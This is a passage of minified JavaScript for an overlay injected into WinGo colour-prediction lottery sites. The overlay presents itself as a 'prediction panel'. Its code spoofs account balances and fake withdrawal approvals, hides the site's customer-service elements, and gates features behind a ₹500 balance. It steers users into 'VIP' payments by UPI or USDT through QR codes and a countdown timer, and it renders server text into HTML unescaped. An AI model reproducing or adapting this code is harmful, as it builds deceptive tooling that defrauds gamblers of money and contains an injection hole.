          }));
        let l = n.querySelector("#spoof-withdrawals-list");
        if (l)
          l.addEventListener("click", ($) => {
            let J = $.target.closest("button[data-id]");
            if (!J) return;
            let z = J.getAttribute("data-id"),
              O = J.classList.contains("btn-approve") ? 1 : 0;
            if (window.__wgSpoofer)
              window.__wgSpoofer.updateWithdrawalStatus(z, O);
            this._renderWithdrawals();
          });
        let v = Bn();
        if (v) {
          let $ = n.querySelector("#pro-mode");
          if ($) $.textContent = vt(v);
          if (!yt().length) en();
        }
        let q = document.createElement("style");
        ((q.textContent = ".customer,.changlongEnter{display:none!important}"),
          document.head.appendChild(q),
          Jo(n),
          Oo(n),
          En(n),
          Wo(500),
          Qo());
        let E = () => {
          let $ = document.querySelector("#app");
          if (!$) return;
          let J = $.getBoundingClientRect();
          (this.style.setProperty("--bv-left", J.left + "px"),
            this.style.setProperty("--bv-width", J.width + "px"));
        };
        (E(), new ResizeObserver(E).observe(document.documentElement));
        let W = ($) => {
          if (typeof $?.detail?.balance === "number")
            window.__wg_balance = $.detail.balance;
          if (this._gateView.style.display === "block") this._checkBalance();
        };
        (window.addEventListener("wg-qualified", W),
          window.addEventListener("wg-balance", W));
      }
      _checkBalance() {
        if (sessionStorage.getItem("wg_qualified")) {
          ((this._body.style.display = "block"),
            (this._gateView.style.display = "none"));
          return;
        }
        let n = window.__wg_balance || 0;
        if (window.__wgSpoofer && window.__wgSpoofer.isVip())
          try {
            let t = JSON.parse(localStorage.getItem("wg_spoof_state"));
            if (t && t.balance !== null) n = t.balance;
          } catch (t) {}
        if (((this._gateBal.textContent = "₹" + Number(n).toFixed(2)), n < 500))
          ((this._body.style.display = "none"),
            (this._gateView.style.display = "block"));
        else
          ((this._body.style.display = "block"),
            (this._gateView.style.display = "none"));
      }
      _showPanel() {
        ((this._mode = "panel"), (this._logo.style.display = "none"));
        let n = this._gateView.style.display === "block";
        if ((this._panel.classList.add("active"), n))
          ((this._body.style.display = "block"),
            (this._gateView.style.display = "none"),
            this._setView("menu"));
        let t = An("panel");
        if (t) bn(this, t);
        else qo(this, this._panel);
      }
      _showLogo() {
        ((this._mode = "logo"),
          this._panel.classList.remove("active"),
          (this._logo.style.display = "block"),
          bn(this, An("logo")));
      }
      _setView(n) {
        this.shadowRoot
          .querySelectorAll(".view")
          .forEach((o) => o.classList.remove("active"));
        let t = this.shadowRoot.querySelector(".view-" + n);
        if (t) t.classList.add("active");
      }
      _startVipCheckout(n) {
        this._checkoutType = n;
        let t = this.shadowRoot,
          o = t.querySelector("#vip-loader");
        ((o.style.display = "flex"),
          setTimeout(() => {
            o.style.display = "none";
            let c =
              "VIP-" +
              Math.floor(Math.random() * 16777215)
                .toString(16)
                .toUpperCase()
                .padStart(6, "0");
            if (((t.querySelector("#vip-order-id").textContent = c), Un))
              clearInterval(Un);
            let f = "",
              p = "",
              l = "";
            if (n === "upi") {
              Tn = 0;
              let E = B.upi;
              ((f = E[0]),
                (p = "₹" + B.amount),
                (t.querySelector("#vip-checkout-title").textContent =
                  "UPI Payment"),
                (t.querySelector("#vip-address-lbl").textContent = "UPI ID"),
                (t.querySelector("#vip-network-lbl").style.display = "none"));
              let W = encodeURIComponent(f),
                $ = encodeURIComponent("VIP"),
                J = encodeURIComponent(B.amount),
                z = `upi://pay?pa=${W}&pn=${$}&am=${J}&cu=INR`;
              if (
                ((l = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(z)}`),
                E.length > 1)
              )
                t.querySelector("#vip-upi-hint").style.display = "flex";
              else t.querySelector("#vip-upi-hint").style.display = "none";
            } else
              ((f = B.crypto.trc20),
                (p = `$${B.cryptoAmountUsd.toFixed(2)} USDT`),
                (t.querySelector("#vip-checkout-title").textContent =
                  "Crypto USDT"),
                (t.querySelector("#vip-address-lbl").textContent =
                  "USDT Address"),
                (t.querySelector("#vip-network-lbl").style.display =
                  "inline-block"),
                (t.querySelector("#vip-upi-hint").style.display = "none"),
                (l = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(f)}`));
            ((t.querySelector("#vip-address-val").textContent = f),
              (t.querySelector("#vip-checkout-amount").textContent = p),
              (t.querySelector("#vip-qr-img").src = l));
            let v = Io(),
              q = () => {
                let E = jo(v);
                if (
                  ((t.querySelector("#vip-checkout-timer").textContent =
                    E.text),
                  E.done)
                )
                  clearInterval(Un);
              };
            if ((q(), v > Date.now())) Un = setInterval(q, 1000);
            this._setView("vip-checkout");
          }, 2500));
      }
      _renderVipHistory() {
        let t = this.shadowRoot.querySelector("#vip-history-list");
        if (!t) return;
        let o = [];
        try {
          o = JSON.parse(localStorage.getItem("wg_vip_orders") || "[]");
        } catch (i) {}
        if (o.length === 0) {
          t.innerHTML = `
          <div class="vip-history-empty">
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
              <circle cx="12" cy="12" r="10" />
              <polyline points="12 6 12 12 16 14" />
            </svg>
            <span class="vip-history-empty-title">No Orders Yet</span>
            <span class="vip-history-empty-sub">Completed payments will appear here</span>
          </div>`;
          return;
        }
        t.innerHTML = o
          .map((i) => {
            let c = new Date(i.date).toLocaleString(),
              f = String(i.type).toLowerCase() === "crypto",
              p = f ? "vip-history-crypto" : "vip-history-upi",
              l = f ? "Crypto" : "UPI",
              v = String(i.status || "Pending"),
              q =
                v === "Approved"
                  ? "status-approved"
                  : v === "Rejected"
                    ? "status-rejected"
                    : "status-pending",
              E =
                v === "Rejected" && i.remark
                  ? `<div class="vip-history-remark">${i.remark}</div>`
                  : "";
            return `
          <div class="vip-history-row ${p}">
            <div class="vip-history-row-top">
              <span class="vip-history-type">${l}</span>
              <span class="vip-history-status ${q}">${v}</span>
            </div>
            <span class="vip-history-ref">Ref · ${i.utr}</span>
            <span class="vip-history-date">${c}</span>
            ${E}
          </div>`;
          })
          .join("");
      }
      async _syncVipHistory() {
        let n = [];
        try {
          n = JSON.parse(localStorage.getItem("wg_vip_orders") || "[]");
        } catch (o) {}
        if (!n.length) return;
        let t = n.map((o) => o.utr).filter(Boolean);
        if (!t.length) return;
        try {
          let o = await fetch("/ar-api/vip-sync", {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify({ utrs: t }),
          });
          if (!o.ok) return;
          let i = await o.json();
          if (!i.ok || !i.orders) return;
          let c = !1;
          for (let f of n) {
            let p = i.orders[f.utr];
            if (!p) continue;
            if (f.status !== p.status || (f.remark || "") !== (p.remark || ""))
              ((f.status = p.status), (f.remark = p.remark || ""), (c = !0));
          }
          if (c)
            (localStorage.setItem("wg_vip_orders", JSON.stringify(n)),
              this._renderVipHistory());
        } catch (o) {}
      }
      _syncSettings() {
        if (!window.__wgSpoofer) return;
        let n = window.__wgSpoofer.getSettings(),
          t = this.shadowRoot;
        ((t.querySelector("#spoof-acc-range").value = n.accuracy),
          (t.querySelector("#spoof-acc-num").value = n.accuracy),
          (t.querySelector("#spoof-bal").value = n.balanceOffset),
          this._renderWithdrawals());
      }
      _renderWithdrawals() {
        if (!window.__wgSpoofer) return;
        let n = window.__wgSpoofer.getWithdrawals(),
          t = this.shadowRoot.querySelector("#spoof-withdrawals-list");
        if (!t) return;
        t.innerHTML = "";
        let o = [];
        for (let c in n) o.push(n[c]);
        o.sort((c, f) => f.addTime - c.addTime);
        let i = document.createDocumentFragment();
        (o.forEach((c) => {
          let f = document.createElement("div");
          f.className = "w-item";
          let p = "Processing",
            l = "status-processing";
          if (c.state === 1 || c.state === 2)
            ((p = "Success"), (l = "status-success"));
          else if (c.state === 0 || c.state === 4)
            ((p = "Failed"), (l = "status-failed"));
          ((f.innerHTML = `<div class="w-info"><div class="w-id">${c.withdrawNumber}</div><div class="w-amt">₹${c.amount}</div><div class="w-time">${new Date(c.addTime).toLocaleString()}</div><div class="w-state ${l}">${p}</div></div><div class="w-actions"><button class="btn-approve" data-id="${c.withdrawNumber}">Approve</button><button class="btn-reject" data-id="${c.withdrawNumber}">Reject</button></div>`),
            i.appendChild(f));
        }),
          t.appendChild(i));
      }
    },
  );
function rn() {
  let n = location.hash.includes("/saasLottery/WinGo"),
    t = document.querySelector("prediction-panel");
  if (!t)
    ((t = document.createElement("prediction-panel")),
      document.body.appendChild(t));
  t.dataset.route = n ? "game" : "other";
  let o = document.querySelector(
      ".timer-card.active .card-title, .TimeLeft__C-name",
    ),
    i = String(o?.textContent || "")
      .toLowerCase()
      .replace(/\s+/g, ""),
    c = "";
  if (i.includes("wingo30")) c = "WinGo_30S";
  else if (i.includes("wingo1min") || i.includes("wingo1m")) c = "WinGo_1M";
  else if (i.includes("wingo3min") || i.includes("wingo3m")) c = "WinGo_3M";
  else if (i.includes("wingo5min") || i.includes("wingo5m")) c = "WinGo_5M";
  if (!c) {
    let f = location.hash.match(/gameCode=(WinGo_\w+)/);
    c = f ? f[1] : "";
  }
  if (c && c !== Bn()) at(c);
}
["pushState", "replaceState"].forEach((n) => {
  let t = history[n];
  history[n] = function (...o) {
    (t.apply(this, o), rn());
  };
});
window.addEventListener("hashchange", rn);
setInterval(rn, 500);
setTimeout(rn, 100);
